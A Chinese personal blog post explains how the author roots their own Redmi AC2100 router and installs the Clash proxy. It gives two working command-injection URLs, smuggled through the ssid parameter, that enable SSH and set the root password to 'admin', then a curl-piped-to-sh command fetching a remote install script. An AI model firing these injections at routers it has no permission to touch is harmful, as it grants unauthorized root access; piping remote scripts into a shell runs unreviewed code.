---
title: 在红米ac2100路由器上开启clash
author: ch4ser
typora-root-url: ../
date: 2022-12-12 20:17:03
categories:
  - 技术
---

> 在争取自由这个宏大命题下, 上网自由可以算得上一件"小事", 然而越是小事, 越与我们的日常息息相关.

<!--more-->

事情的起因是装kubernetes遇到了网络问题且换镜像源无用, 想了想自己对在路由器上fq也感兴趣了很久, 索性查查看, 没想到还挺容易的.

## 开启ssh

ac2100这个型号的路由器存在命令注入漏洞, 可以通过该漏洞开启clash.

登陆到路由器面板,从url中复制stok,替换下面的stok

```bash
# 命令执行漏洞开启ssh
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B

# 命令执行漏洞修改ssh密码, 这里用的密码为admin
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
```

然后在自己的电脑上ssh连接,密码admin
```bash
ssh root@192.168.31.1
```

如果报错了,就在`.ssh/config`中添加
```
Host 192.168.31.1
    PubkeyAcceptedAlgorithms +ssh-rsa
    HostkeyAlgorithms +ssh-rsa
```

## 安装clash

ssh登陆到路由器后, 运行:

```bash
export url='https://cdn.jsdelivr.net/gh/juewuy/ShellClash@master' && sh -c "$(curl -kfsSl $url/install.sh)" && source /etc/profile &> /dev/null
```

面板安装不成功的话就换源装.其他就跟着脚本的提示走就可以了
